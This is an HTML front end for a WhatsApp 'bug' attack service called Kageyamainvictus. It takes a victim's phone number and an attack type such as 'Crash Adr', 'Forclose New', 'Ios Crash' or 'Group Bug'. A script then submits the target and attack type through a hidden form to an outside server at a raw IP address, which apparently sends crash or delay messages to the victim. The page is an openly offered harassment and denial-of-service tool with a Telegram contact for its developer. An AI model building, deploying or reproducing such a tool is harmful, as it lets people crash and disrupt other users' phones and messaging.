<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>KageyamainvictusWeb</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root { --main: #ffffff; --second: #cccccc; --bg: #0e0e0e; --text: #eeeeee; }
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
    body {
      background: var(--bg); color: var(--text);
      min-height: 100vh; display: flex;
      justify-content: center; align-items: center;
      padding: 20px; position: relative;
    }
    .glass-box {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 30px; backdrop-filter: blur(10px);
      box-shadow: 0 0 25px rgba(255, 255, 255, 0.2);
      z-index: 2; max-width: 450px; width: 100%;
    }
    .profile { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
    .profile img { width: 65px; height: 65px; border-radius: 50%; border: 2px solid var(--main); }
    .profile-info h2 { font-size: 1.2rem; color: var(--main); }
    .status { font-size: 0.9rem; color: #bbbbbb; }
    .status i { color: #ffffff; margin-right: 5px; }
    h1 { font-size: 1.4rem; color: var(--main); margin-bottom: 20px; text-align: center; animation: neon 2s infinite alternate; }
    .neon {
      color: #0ff;
      text-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 20px #0ff;
      animation: flicker 1.5s infinite alternate;
    }
    @keyframes flicker {
      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
      20%, 24%, 55% { opacity: 0.4; }
    }
    @keyframes neon { from { text-shadow: 0 0 10px var(--main); } to { text-shadow: 0 0 25px var(--second); } }
    input {
      background: rgba(255, 255, 255, 0.05);
      color: white;
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      padding: 12px;
      width: 100%;
      margin-bottom: 10px;
      transition: 0.3s;
    }
    input:focus {
      outline: none; border: 1px solid var(--main);
      background: rgba(255, 255, 255, 0.1);
    }
    .bug-card {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 15px;
      padding: 12px 20px;
      display: flex; align-items: center;
      gap: 10px; cursor: pointer; transition: 0.3s;
    }
    .bug-card i { font-size: 1.2rem; color: #ffffff; }
    .bug-card span { font-size: 1rem; color: white; }
    .bug-card:hover { background: rgba(255, 255, 255, 0.1); transform: scale(1.03); }
    .bug-card.active { border: 2px solid var(--main); box-shadow: 0 0 12px var(--main); }
    button {
      background: linear-gradient(135deg, var(--main), var(--second));
      border: none; color: black;
      width: 100%; padding: 14px;
      border-radius: 50px;
      font-size: 1rem;
      cursor: pointer;
      display: flex; align-items: center; justify-content: center;
      gap: 10px; box-shadow: 0 0 15px var(--main);
      transition: 0.3s;
      margin-top: 10px;
    }
    .small-logout {
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid var(--main);
      color: var(--main);
      font-size: 0.85rem;
      padding: 8px 16px;
      border-radius: 12px;
      margin-top: 10px;
      cursor: pointer;
      transition: 0.3s;
      width: fit-content;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    .small-logout:hover { background: rgba(255, 255, 255, 0.2); }
  </style>
</head>
<body>
  <div class="glass-box" id="main-box">
    <div class="profile">
      <img src="https://files.catbox.moe/5gmcmz.jpg" alt="profile">
      <div class="profile-info">
        <h2>deffa</h2>
        <span class="status"><i class="fas fa-circle"></i> Connected</span>
      </div>
    </div>
    <h1 class="neon"><i class="fab fa-whatsapp"></i> Kageyamainvictus</h1>
    <input type="text" id="target" placeholder="628xxxxxxxxxx" />

    <!-- Bug Types -->
    <div class="bug-card" data-bug="delayinvis"><i class="fas fa-clock"></i><span>Delay Invis</span></div>
    <div class="bug-card" data-bug="delayvisible"><i class="fas fa-eye"></i><span>Delay Visible</span></div>
    <div class="bug-card" data-bug="maklo"><i class="fas fa-bug"></i><span>Crash Adr</span></div>
    <div class="bug-card" data-bug="confusion"><i class="fas fa-random"></i><span>Stupid</span></div>
    <div class="bug-card" data-bug="forclosespam"><i class="fas fa-skull-crossbones"></i><span>Forclose New</span></div>
    <div class="bug-card" data-bug="delayblank"><i class="fas fa-file"></i><span>Blank</span></div>
    <div class="bug-card" data-bug="iosinvis"><i class="fab fa-apple"></i><span>Ios Invis</span></div>
    <div class="bug-card" data-bug="ios"><i class="fab fa-apple"></i><span>Ios Crash</span></div>
    <div class="bug-card" data-bug="group"><i class="fas fa-users"></i><span>Group Bug</span></div>

    <button id="sendBtn" onclick="sendBug()"><i class="fas fa-bug"></i> Kirim Bug</button>
    <button class="small-logout" onclick="location.reload()">Logout</button>
    <div id="result" style="margin-top:10px; text-align:center;"></div>
    <div style="margin-top: 20px; color: white; text-align:center;">
      <p>Contact Developer:</p>
      <a href="https://t.me/leakvjs" target="_blank" style="color: #00acee; text-decoration: none;">
        <i class="fab fa-telegram"></i> @axpaw O`vovTzmxv
      </a>
    </div>
  </div>

  <form id="bugForm" target="hiddenFrame" method="GET" style="display:none;"></form>
  <iframe name="hiddenFrame" style="display:none;"></iframe>

  <script>
    let selectedBug = "delayinvis";

    document.querySelectorAll(".bug-card").forEach(card => {
      card.addEventListener("click", () => {
        document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
        card.classList.add("active");
        selectedBug = card.getAttribute("data-bug");
      });
    });

    function sendBug() {
      const input = document.getElementById("target").value.trim();
      const resDiv = document.getElementById("result");

      if (!/^\d{10,15}$/.test(input)) {
        resDiv.innerText = "‚ùå Masukkan nomor WA yang valid!";
        resDiv.style.color = "crimson";
        return;
      }

      const chatId = `${input}@s.whatsapp.net`;
      const apiUrl = `http://152.42.187.246:2038/evolution?type=${selectedBug}&chatId=${chatId}`;

      const form = document.getElementById("bugForm");
      form.action = apiUrl;
      form.submit();

      resDiv.innerText = `üöÄ Bug (${selectedBug}) dikirim ke ${chatId}`;
      resDiv.style.color = "lime";
    }
  </script>
</body>
</html>
